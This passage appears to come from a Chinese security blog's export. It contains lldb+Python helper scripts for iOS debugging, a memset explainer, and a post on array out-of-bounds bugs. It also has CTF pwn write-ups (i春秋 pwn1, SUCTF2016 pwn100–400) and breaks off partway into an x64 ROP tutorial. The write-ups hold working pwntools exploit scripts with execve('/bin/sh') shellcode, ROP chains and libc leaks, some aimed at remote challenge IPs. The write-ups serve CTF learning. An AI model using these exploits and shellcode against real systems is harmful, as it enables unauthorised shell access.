    <content><![CDATA[<p>总所周知，砸壳之后的iOS应用动态调试一般都使用lldb，相较于Android通过AS动态调试smali界面化操作，lldb的命令行无疑显得操作繁琐许多。作为一个合格的懒人，追求简单是我的本能，经过多方资料的收集，了解到lldb+python可极大的提高lldb动态调试效率。简单整理出lldb+python提高iOS动态调试效率的几个函数。<br><a id="more"></a></p>
<h1 id="lldb脚本桥接"><a href="#lldb脚本桥接" class="headerlink" title="lldb脚本桥接"></a>lldb脚本桥接</h1><p>LLDB的脚本桥接是调试器的一个Python接口。通过这个接口可以在LLDB中加载和执行Python代码。在Python代码中，你可以引入lldb模块来与调试器交互来获取各种信息（比如命令的参数等）。</p>
<p>首先可以通过script命令直接打开lldb中的python解释器，script命令添加各种参数即可进行桥接。</p>
<p>查看python版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">$ lldb</div><div class="line">(lldb) script <span class="keyword">import</span> sys</div><div class="line">(lldb) script <span class="keyword">print</span> (sys.version)</div><div class="line"><span class="number">2.7</span><span class="number">.10</span> (default, Feb <span class="number">22</span> <span class="number">2019</span>, <span class="number">21</span>:<span class="number">17</span>:<span class="number">52</span>) </div><div class="line">[GCC <span class="number">4.2</span><span class="number">.1</span> Compatible Apple LLVM <span class="number">10.0</span><span class="number">.1</span> (clang<span class="number">-1001.0</span><span class="number">.37</span><span class="number">.14</span>)]</div></pre></td></tr></table></figure>
<h1 id="Helloword"><a href="#Helloword" class="headerlink" title="Helloword"></a>Helloword</h1><p>首先新建一个目录存放你的lldb Python脚本，比如我把它放在~/lldb中，该目录下新建HelloWorld.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">helloworld</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    print(<span class="string">"hello world!"</span>)</div></pre></td></tr></table></figure>
<p>在lldb中输入以下命令即可使用上述Python代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">(lldb) command script <span class="keyword">import</span> ~/lldb/HelloWorld.py</div><div class="line">(lldb) command script add -f HelloWorld.helloworld hello</div><div class="line">(lldb) hello</div><div class="line">hello world!</div></pre></td></tr></table></figure>
<p>但是每次输入这么繁琐的命令明显不是我们的初衷，llldb有个函数lldb_init_module，一旦Python模块被加载到LLDB中时它就会被调用。因此只要我们在这个函数里面将helloworld安装到LLDB里面去.</p>
<p>在HelloWorld.py中加入下面的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">__lldb_init_module</span><span class="params">(debugger, internal_dict)</span>:</span></div><div class="line">    command script add -f HelloWorld.helloworld hello</div></pre></td></tr></table></figure>
<p>然后在~/.lldbinit中import这个脚本，如果没有.lldbinit这个文件，touch ~/.lldbinit新建一个即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">command script <span class="keyword">import</span> ~/lldb/HelloWorld.py</div></pre></td></tr></table></figure>
<p>这样在加载lldb之后输入hello直接会输出helloworld了。</p>
<h1 id="分享脚本-持续更新"><a href="#分享脚本-持续更新" class="headerlink" title="分享脚本(持续更新)"></a>分享脚本(持续更新)</h1><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># !/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> lldb</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="comment"># 获取ASLR偏移地址</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fy_get_ASLR</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    <span class="comment"># 获取'image list -o'命令的返回结果</span></div><div class="line">    interpreter = lldb.debugger.GetCommandInterpreter()</div><div class="line">    returnObject = lldb.SBCommandReturnObject()</div><div class="line">    interpreter.HandleCommand(<span class="string">'image list -o'</span>, returnObject)</div><div class="line">    output = returnObject.GetOutput()</div><div class="line">    <span class="comment"># 正则匹配出第一个0x开头的16进制地址</span></div><div class="line">    match = re.match(<span class="string">r'.+(0x[0-9a-fA-F]+)'</span>, output)</div><div class="line">    <span class="keyword">if</span> match:</div><div class="line">        <span class="keyword">print</span> match.group(<span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ASLR</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># 获取'image list -o'命令的返回结果</span></div><div class="line">    interpreter = lldb.debugger.GetCommandInterpreter()</div><div class="line">    returnObject = lldb.SBCommandReturnObject()</div><div class="line">    interpreter.HandleCommand(<span class="string">'image list -o'</span>, returnObject)</div><div class="line">    output = returnObject.GetOutput();</div><div class="line">    <span class="comment"># 正则匹配出第一个0x开头的16进制地址</span></div><div class="line">    match = re.match(<span class="string">r'.+(0x[0-9a-fA-F]+)'</span>, output)</div><div class="line">    <span class="keyword">if</span> match:</div><div class="line">        <span class="keyword">return</span> match.group(<span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_conn</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    <span class="comment"># 获取'image list -o'命令的返回结果</span></div><div class="line">    interpreter = lldb.debugger.GetCommandInterpreter()</div><div class="line">    returnObject = lldb.SBCommandReturnObject()</div><div class="line">    interpreter.HandleCommand(<span class="string">'process connect connect://127.0.0.1:12345'</span>, returnObject)</div><div class="line">    output = returnObject.GetOutput()</div><div class="line"></div><div class="line"></div><div class="line"> <span class="comment"># Super breakpoint</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sbr</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#用户是否输入了地址参数</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'Please input the address!'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line"></div><div class="line">    ASLR = get_ASLR()</div><div class="line">    <span class="keyword">if</span> ASLR:</div><div class="line">        <span class="comment">#如果找到了ASLR偏移，就设置断点</span></div><div class="line">        debugger.HandleCommand(<span class="string">'br set -a "%s+0x%s"'</span> % (ASLR, command))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'ASLR not found!'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base_add</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    </div><div class="line">    <span class="comment">#用户是否输入了地址参数</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'Please input the address!'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line">    </div><div class="line">    ASLR = get_ASLR()</div><div class="line">    <span class="keyword">if</span> ASLR:</div><div class="line">        <span class="comment">#如果找到了ASLR偏移，就设置断点</span></div><div class="line">        <span class="keyword">print</span> hex(int(command, <span class="number">16</span>) - int(ASLR, <span class="number">16</span>))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'ASLR not found!'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">watch_point</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    <span class="comment">#用户是否输入了地址参数</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'Please input the address!'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line">	debugger.HandleCommand(<span class="string">'watchpoint set expression "%s"'</span> % (command))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">watch_read_point</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    <span class="comment">#用户是否输入了地址参数</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'Please input the address!'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line"></div><div class="line">	debugger.HandleCommand(<span class="string">'watchpoint set expression -w read -- "%s"'</span> % (command))</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">__lldb_init_module</span><span class="params">(debugger, internal_dict)</span>:</span></div><div class="line">    <span class="comment">#获取偏移地址</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add -f helloworld.fy_get_ASLR pianyi'</span>)</div><div class="line">    <span class="comment"># 'command script add sbr' : 给lldb增加一个'sbr'命令</span></div><div class="line">    <span class="comment"># '-f sbr.sbr' : 该命令调用了sbr文件的sbr函数</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add sbr -f helloworld.sbr'</span>)</div><div class="line">    <span class="comment">#挂载进程连接</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add -f helloworld.process_conn pp'</span>)</div><div class="line">    <span class="comment">#内存读断点</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add mw -f helloworld.watch_point'</span>)</div><div class="line">	<span class="comment">#内存访问断点</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add mr -f helloworld.watch_read_point'</span>)</div><div class="line">	<span class="comment">#获取实际地址</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add gba -f helloworld.get_base_add'</span>)</div></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>Debug</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>memset函数的用法</title>
    <url>/2016/10/26/memset%E5%87%BD%E6%95%B0%E7%9A%84%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>在通过IDA逆向伪代码分析程序的时候，经常会遇到memset()这个函数，格式一般如下所示：<br><a id="more"></a></p>
<pre><code>memset(&amp;v1, 0, 0x80u);
</code></pre><p>一直以为是开辟一个堆栈空间，知道今天专门看了别人写的博客才知道自己大错特错，接下来就我学习到的相关知识做一个总结。</p>
<p>memset()的函数， 它可以一字节一字节地把整个数组设置为一个指定的值。 </p>
<pre><code>#include &lt;mem.h&gt; 
void* memset(void* s, int c, size_t n)
{
    unsigned char* p = (unsigned char*) s;
    while (n &gt; 0) {
    *p++ = (unsigned char) c;
    --n;
    }
    return s;
} 
</code></pre><p>memset()函数在mem.h头文件中声明，它把数组的起始地址作为其第一个参数，第二个参数是设置数组每个字节的值，第三个参数是数组的长度(字节数，不是元素个数)。</p>
<p>其函数原型为：</p>
<pre><code>void *memset(void*，int，unsigned)；其中void*表示地址。
</code></pre><p>　　例如，下面的代码用数组做参数传递给标准函数memset()，以让其将数组设置成全0：</p>
<pre><code>　#include&lt;mem.h&gt;
　void main()
　{
　　int ia1[50]；
　　int ia2[500]；
　　memset(iai,0,50*sizeof(int))；
　　memset(ia2,0,500*sizeof(int))；
　　//
　}
</code></pre><p>　　memset()的第一个实参是数组名，数组名作参数即数组作参数，它仅仅只是一个数组的起始地址而已。</p>
<p>　　在函数memset()栈区，从返回地址往上依次为第1，2，3个参数。第1个参数中的内容是main()函数中定义的数组ia1的起始地址。第2个参数是给数组设置的值(0)，第3个参数是数组的长度(50*2)。函数返回时，main()函数的数组中内容全置为0。</p>
<pre><code>0x00、void *memset(void *s,int c,size_t n)
总的作用：将已开辟内存空间 s 的首 n 个字节的值设为值 c。

0x01、例子
＃include

void main(){
char *s=&quot;Golden Global View&quot;;

clrscr();

memset(s,&apos;G&apos;,6);
printf(&quot;%s&quot;,s);

getchar();
return 0;
}　

0x02、memset() 函数常用于内存空间初始化。如：
char str[100];
memset(str,0,100);

0x03、memset()的深刻内涵：用来对一段内存空间全部设置为某个字
符，一般用在对定义的字符串进行初始化为‘ ’或‘\0’；
例:char a[100];memset(a, &apos;\0&apos;, sizeof(a));

memcpy用来做内存拷贝，你可以拿它拷贝任何数据类型的对象，可以
指定拷贝的数据长度；例：char a[100],b[50]; memcpy(b, a, sizeof(b));
注意如用sizeof(a)，会造成b的内存地址溢出。

strcpy就只能拷贝字符串了，它遇到&apos;\0&apos;就结束拷贝；
例：char a[100],b[50];strcpy(a,b);如用strcpy(b,a)，
要注意a中的字符串长度（第一个‘\0’之前）是否超过50位，如超过，则会造成b的内存地址溢出。

0x04、memset可以方便的清空一个结构类型的变量或数组。

如：
struct sample_struct
{
char csName[16];
int iSeq;
int iType;
};

对于变量
struct sample_strcut stTest;

一般情况下，清空stTest的方法：
stTest.csName[0]=&apos;\0&apos;;
stTest.iSeq=0;
stTest.iType=0;

用memset就非常方便：
memset(&amp;stTest,0,sizeof(struct sample_struct));

如果是数组：
struct sample_struct TEST[10];
则
memset(TEST,0,sizeof(struct sample_struct)*10);
</code></pre>]]></content>
      <tags>
        <tag>函数</tag>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn之-数组下标越界</title>
    <url>/2016/08/09/pwn%E4%B9%8B-%E6%95%B0%E7%BB%84%E4%B8%8B%E6%A0%87%E8%B6%8A%E7%95%8C/</url>
    <content><![CDATA[<p><strong>下标越界</strong></p>
<p>在引用数组元素时，使用的下标超过了该数组下标的应有范围，但应注意的是:<br><a id="more"></a><br>    C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的<br>    数组或者甚至是写入程序的代码。不检查下标是否越界可以有效提高程序运行<br>    的效率，因为如果你检查，那么编译器必须在生成的目标代码中加入额外的代<br>    码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以<br>    为了程序的运行效率，C / C++才不检查下标是否越界。发现如果数组下标越<br>    界了，那么它会自动接着那块内存往后写。 </p>
<p>关于C/C++为什么不对数组的下标是否越界做检查，可以参考：<br>This is an <a href="http://www.xuebuyuan.com/967089.html" target="_blank" rel="external">http://www.xuebuyuan.com/967089.html</a></p>
<p>因为编译器不会自动检测你的数组下标是否越界，而是把这个任务交给了程序员自己，所以我们在写程序，引用数组元素时，一定注意不要让数组的下标越界。</p>
<p>还有，初学者一定不能忘了数组的下标是从0开始的，不是常识中的从1开始。</p>
<p>例一</p>
<pre><code>1    void test1()
2    {
3        char string[10];
4        char* str1 = &quot;0123456789&quot;;
5        strcpy(string, str1);
6    }
</code></pre><p>例二</p>
<pre><code>1    void test2()
2    {
3        char string[10], str1[10];
4        int i;
5        for(i=0; i&lt;10; i++)
6        {
7            str1[i] = &apos;a&apos;;
8        }
9        strcpy(string, str1);
10   }
</code></pre><p>例三</p>
<pre><code>1    void test3(char* str1)
2    {
3        char string[10];
4        if(strlen(str1) &lt;= 10)
5        {
6            strcpy(string, str1); 
7        }
8    }
</code></pre><p>这3个例子都有数组越界的问题。</p>
<p>例一中，string是一个含有10个元素的字符数组，str1指向的字符串长度为10，在进行strcpy调用时，会将str1的结束符也复制到string数组里，即复制的字符个数为11，这样会导致string出现数组越界。程序不一定会因此而崩溃，但这是一个潜在的危险。解决办法是将string的元素个数定义为11。</p>
<p>例二中，str1和string都是含有10个元素的字符数组，并且str1的元素全部被赋为字符”a”，然后再调用strcpy。这里会出现以下两个问题：一个问题是str1表示的字符数组没有以’\0’结束，在随后调用strcpy时无法判断什么时候复制结束；另一个问题是string的数组长度不够，出现数组越界的现象。解决办法是将string和str1的元素个数都定义为11个，并在调用strcpy之前加入一条语句把str1[10]赋为’\0’。</p>
<p>例三中，if语句使用小于等于”&lt;=”进行比较，如果str1的长度等于10，也会出现数组越界的情况。解决办法是把”&lt;=”换成”&lt;”。</p>
<p>改正后的程序如下所示。</p>
<p>例一</p>
<pre><code>1    void test1()
2    {
3        char string[11];           //字符数组长度为11，多分配一个
4        char* str1 = &quot;0123456789&quot;;
5        strcpy(string, str1);
6    }
</code></pre><p>例二</p>
<pre><code>1    void test2()
2    {
3        char string[11], str1[11];   //字符数组长度都为11，均多分配一个
4        int i;
5        for(i=0; i&lt;10; i++)
6        {
7            str1[i] = &apos;a&apos;;
8        }
9        str1[10] = &apos;\0&apos;;            //初始化str1为空字符串
10       strcpy(string, str1);
11   }
</code></pre><p>例三</p>
<pre><code>1    void test3(char*str1)
2    {
3        char string[10];
4        if(strlen(str1) &lt; 10)        //不能用&lt;=
5        {
6            strcpy(string, str1); 
7        }
8    }
</code></pre><h2 id="i春秋30强挑战赛pwn1-writeup"><a href="#i春秋30强挑战赛pwn1-writeup" class="headerlink" title="i春秋30强挑战赛pwn1 writeup"></a>i春秋30强挑战赛pwn1 writeup</h2><p>在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。</p>
<p><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-1.png" alt=""><br><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-2.png" alt=""></p>
<p>通过GDB调试，发现发送29控制eip，nx：disabled，布置好shellcode后直接getshell。</p>
<p><img src="http://p1.bqimg.com/567571/d6a4b67df29cab11.png" alt=""></p>
<p><img src="http://p1.bqimg.com/567571/497e098424fb5aee.png" alt=""></p>
<p><strong>利用代码</strong></p>
<pre><code>from pwn import *
# io = process(&quot;./tc1&quot;)
io = remote(&quot;106.75.9.11&quot;, 20000)
io.recvuntil(&quot;4. Divide&quot;)
io.sendline(&quot;29&quot;)
io.recvuntil(&quot;[123 110]&quot;)
payload = p32(0x804a0a4) + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;
io.sendline(payload)
io.interactive()
</code></pre>]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn之第二更SUCTF2016</title>
    <url>/2016/11/29/pwn%E4%B9%8B%E7%AC%AC%E4%BA%8C%E6%9B%B4SUCTF2016/</url>
    <content><![CDATA[<p><a href="http://pan.baidu.com/s/1ge73Bn9" target="_blank" rel="external">题目链接</a><br><a id="more"></a></p>
<h2 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h2><p>从来没见过这样的pwn，IDA分析一下直接就看到了flag，这是什么鬼？</p>
<p>但是本着初学者的心态，还是乖乖的写了exp，这个题只要覆盖地址到关键函数，输入zhimakaimen就可以看到flag。</p>
<p>本地调试代码如下：</p>
<pre><code>from pwn import *


io=process(&apos;./pwn100&apos;)
get_flag=0x0804865D
password=&apos;zhimakaimen&apos;
def exp():


    payload=&apos;A&apos;*111+chr(0)+p32(get_flag)
    io.sendline(payload)
    io.sendline(password)
    io.interactive()


if __name__==&apos;__main__&apos;:
    exp()
</code></pre><h2 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h2><p>这个题目应该是x86下的rop的考查，IDA可以看到有system()函数，可以将‘/bin/sh’写入到bss段里获得shell</p>
<p>本地调试的代码如下：</p>
<pre><code>from pwn import *

io=process(&apos;./pwn200&apos;)

systemplt=0x080483c0
readplt=0x080483a0
bssadd=0x0804a040
pppr=0x080485fd

def exp():


    payload=&apos;A&apos;*112+p32(readplt)+p32(pppr)+p32(0)+p32(bssadd)+p32(8)+p32(systemplt)+p32(0xdeadbeef)+p32(bssadd)
    ##payload+=&apos;C&apos;*(256-len(payload))
    io.sendline(payload)
    io.send(&quot;/bin/sh\0&quot;)
    io.interactive()


if __name__==&apos;__main__&apos;:
    exp()
</code></pre><h2 id="pwn300"><a href="#pwn300" class="headerlink" title="pwn300"></a>pwn300</h2><p>这个题目一到手分析之后就想利用DynElf去泄漏system地址，然后将/bin/sh写入bss段提shell，但是脚本最后不能运行，之后发现程序居然是静态编译成的！！！</p>
<p>之后学习了利用mmap函数映射内存空间将shellcode写入到里面，然后就可以提shell，具体脚本如下：</p>
<pre><code>from pwn import *

#r = remote(&quot;106.75.84.74&quot;, 10001)#pwn
r = remote(&quot;118.193.194.73&quot;,10002)#pwn
#r = process(&quot;./pwn300&quot;)

mmap = 0x08052420
main = 0x08048254
read = 0x080518A0

r.recvuntil(&quot;payload:&quot;)
payload = &quot;a&quot;*0x70
payload += p32(mmap)
payload += p32(main)
payload += p32(0xb6ffd000)
payload += p32(0x100)
payload += p32(0x7)
payload += p32(0x22)
payload += p32(0xffffffff)
payload += p32(0)
r.sendline(payload)

r.recvuntil(&quot;payload:&quot;)
payload = &quot;a&quot;*0x68
payload += p32(read)
payload += p32(0xb6ffd000)
payload += p32(0)
payload += p32(0xb6ffd000)
payload += p32(0x40)
r.sendline(payload)

payload = &quot;\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot;

r.sendline(payload)
r.interactive()
</code></pre><p>里面涉及到mmap的几个参数, 主要是prot和flags,<br>其值的定义在 glibc/bits/mman-linux.h 文件中:</p>
<pre><code>#define PROT_READ        0x1                /* Page can be read.  */
#define PROT_WRITE       0x2                /* Page can be written.  */
#define PROT_EXEC        0x4                /* Page can be executed. */
#define PROT_NONE        0x0                /* Page can not be accessed.  */
</code></pre><p>这个prot的4个参数, 根linux的权限设置差不多, 这里我把映射的地址设为 rwx , 所以其值为7<br>然后是flags的定义:</p>
<pre><code>#define MAP_SHARED        0x01           /* Share changes.  */
#define MAP_PRIVATE       0x02           /* Changes are private.  */
#define MAP_FIXED         0x10           /* Interpret addr exactly.  */
#ifdef __USE_MISC
# define MAP_FILE         0
# ifdef __MAP_ANONYMOUS
#  define MAP_ANONYMOUS   __MAP_ANONYMOUS /* Don&apos;t use a file.  */
# else
#  define MAP_ANONYMOUS   0x20            /* Don&apos;t use a file.  */
# endif
# define MAP_ANON        MAP_ANONYMOUS
</code></pre><p>flags我们需要设置 MAP_ANONYMOUS 和 MAP_PRIVATE</p>
<p>需要注意的是题目里面还有个小坑，</p>
<p>在0x08048257下个断点，此时的esp=0xffffcfd8<br>之后在0x0804825a下断点，此时的esp=0xffffcfd0<br>执行之后平白无故少了8个字节<br>所以v5的地址esp+1C从64变为6c，所以第一段payload是70，然而执行shellcode的时候地址最低位已经是0了，所以第二个payload是68</p>
<p>由于文件是静态编译的，也可以通过ROPgadget直接寻找rop链，ROPgadget –binary pwn300 –ropchain</p>
<pre><code>from pwn import *
r = process(&quot;./pwn300&quot;)

from struct import pack

# Padding goes here
p = &apos;&apos;

p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca160) # @ .data
p += pack(&apos;&lt;I&apos;, 0x08097d94) # pop eax ; ret
p += &apos;/bin&apos;
p += pack(&apos;&lt;I&apos;, 0x08079281) # mov dword ptr [edx], eax ; ret
p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca164) # @ .data + 4
p += pack(&apos;&lt;I&apos;, 0x08097d94) # pop eax ; ret
p += &apos;//sh&apos;
p += pack(&apos;&lt;I&apos;, 0x08079281) # mov dword ptr [edx], eax ; ret
p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca168) # @ .data + 8
p += pack(&apos;&lt;I&apos;, 0x080977cf) # xor eax, eax ; ret
p += pack(&apos;&lt;I&apos;, 0x08079281) # mov dword ptr [edx], eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0805269e) # pop ebx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca160) # @ .data
p += pack(&apos;&lt;I&apos;, 0x0805269d) # pop ecx ; pop ebx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca168) # @ .data + 8
p += pack(&apos;&lt;I&apos;, 0x080ca160) # padding without overwrite ebx
p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca168) # @ .data + 8
p += pack(&apos;&lt;I&apos;, 0x080977cf) # xor eax, eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0804884d) # int 0x80
print len(p)+0x68

r.sendline(payload)
r.interactive()
</code></pre><h2 id="pwn400"><a href="#pwn400" class="headerlink" title="pwn400"></a>pwn400</h2><p>本题主要的思路就是利用DynELF泄漏system地址，然后将/bin/sh写入bss段，还有就是通过Gadget的利用</p>
<pre><code># -*-coding:utf-8-*-

from pwn import *

r = remote(&quot;23.106.148.10&quot;,20000)#pwn
#r = process(&quot;./simple&quot;)

write_plt = 0x00000000004004B0
read_plt = 0x00000000004004D0
main = 0x0000000004005F6
bss = 0x000000000600a70 + 0x100

pop_rdi_ret = 0x00000000004006c3
pop_rsi_pop_r15_ret = 0x00000000004006c1

def leak(addr):
    r.recvuntil(&quot;luck!\n&quot;)
    payload = &quot;a&quot;*0x28
    payload += p64(pop_rdi_ret)
    payload += p64(0x1)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(addr)
    payload += p64(0x6161616161616161)
    payload += p64(write_plt)
    payload += p64(main)
    r.sendline(payload)
    data = r.recv(8)
    return data

d = DynELF(leak, main, elf=ELF(&apos;./simple&apos;))
system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
print &quot;[*] system addr:{0}&quot;.format(hex(system_addr))

r.recvuntil(&quot;luck!\n&quot;)
payload = &quot;a&quot; * 0x28
payload += p64(pop_rdi_ret)
payload += p64(0x0)
payload += p64(pop_rsi_pop_r15_ret)
payload += p64(bss)
payload += p64(0x6161616161616161)
payload += p64(read_plt)
payload += p64(main)
r.sendline(payload)

r.sendline(&quot;/bin/sh&quot;)

r.recvuntil(&quot;luck!\n&quot;)
payload = &quot;a&quot; * 0x28
payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(system_addr)
r.sendline(payload)


r.interactive()
</code></pre>]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn学习rop之x64篇</title>
    <url>/2016/11/21/pwn%E5%AD%A6%E4%B9%A0rop%E4%B9%8Bx64%E7%AF%87/</url>
    <content><![CDATA[<p>rop x64学习笔记<br><a id="more"></a></p>
<h2 id="linux-64与linux-86的区别"><a href="#linux-64与linux-86的区别" class="headerlink" title="linux_64与linux_86的区别"></a>linux_64与linux_86的区别</h2><p>linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p>
<p>我们还是拿实际程序做例子进行讲解,test.c内容如下：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void callsystem()
{
    system(&quot;/bin/sh&quot;);
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
    vulnerable_function();
}
</code></pre><p>我们打开ASLR并用如下方法编译：</p>
<pre><code>$ gcc -fno-stack-protector test.c -o test3
</code></pre><p>通过分析源码，我们可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到callsystem()这个函数的地址上即可。因为程序本身在内存中的地址不是随机的，所以不用担心函数地址发生改变。接下来就是要找溢出点了。我们还是用老方法生成一串定位字符串：</p>
<pre><code>gdb-peda$ pattern create 150
&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;
</code></pre><p>然后r输入这个字符串造成程序崩溃</p>
<pre><code>gdb-peda$ r
Starting program: /home/heyuan/桌面/test3 
Hello, World
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
RAX: 0x97 
RBX: 0x0 
RCX: 0x7ffff7b04680 (&lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
RDX: 0x200 
